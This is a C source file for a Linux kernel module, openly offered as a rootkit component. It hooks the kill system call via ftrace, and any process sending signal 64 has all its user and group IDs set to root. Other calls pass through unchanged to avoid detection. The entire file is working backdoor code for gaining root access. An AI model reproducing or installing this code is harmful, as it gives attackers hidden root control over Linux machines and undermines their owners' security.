/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary library includes
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/kallsyms.h>
#include "lib/ftrace_helper.h"

//setting up moudle information for kernel module
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sean Kannanaikal");
MODULE_DESCRIPTION("You have been trapped in a genjutsu");
MODULE_VERSION("0.01");

//function pointers system call kill
static asmlinkage long(*orig_kill)(const struct pt_regs *);

/*
@param a struct pt_regs which is used by the kernel to pass
prametrs to system calls via registers
@returns integer success(0) or failure(1) 
This function is the hook that is installed in place of the systemcall
kill and will elevate the current proc's privlieges 
*/
static asmlinkage int hook_kill(const struct pt_regs *regs){

	//function prototype for elevate privlieges
	void elevatePrivilieges(void);

	//obtained the passed in signal type to kill command via si register
	int sig;
	sig = regs->si;

	//if passed in 64 then elevate the privlieges
	if(sig == 64){
		elevatePrivilieges();
		return 0;
	}

	//to not alert anything carry on with regular kill function if not passed a signal vale of 64
	return orig_kill(regs);
}

/*
This function will go ahead and elevate the prvlieges of the
current process communicating with the kernel module as such
a quick and easy way to elevate privlieges of a rootshell.
*/
void elevatePrivilieges(void){
	//obtain the crednetials structure used by the kernel evaluate the cred level of process
	struct cred *credentials;
	credentials = prepare_creds();

	if(credentials == NULL){
		return;
	}

	//promote all to 0 or root
	credentials->uid.val = 0;
	credentials->gid.val = 0;
	credentials->euid.val = 0;
	credentials->egid.val = 0;
	credentials->suid.val = 0;
	credentials->sgid.val = 0;
	credentials->fsuid.val = 0;
	credentials->fsgid.val = 0;

	//commit them and make it official
	commit_creds(credentials);
}

//array for defining hooks according to xcellerators ftrace helper library function
static struct ftrace_hook hooks[] = {
		HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

//init function to run upon iitilaization of kernel module will install function hook on kill
static int __init elevate_init(void){
	int error; 
	error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(error){
		return error;
	}
	return 0;
}

//exit function to run upon removal of kernel module will uninstall function hooks on kill
static void __exit elevate_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

//setting init and exit as corresponding functions for initalization and exit
module_init(elevate_init);
module_exit(elevate_exit);
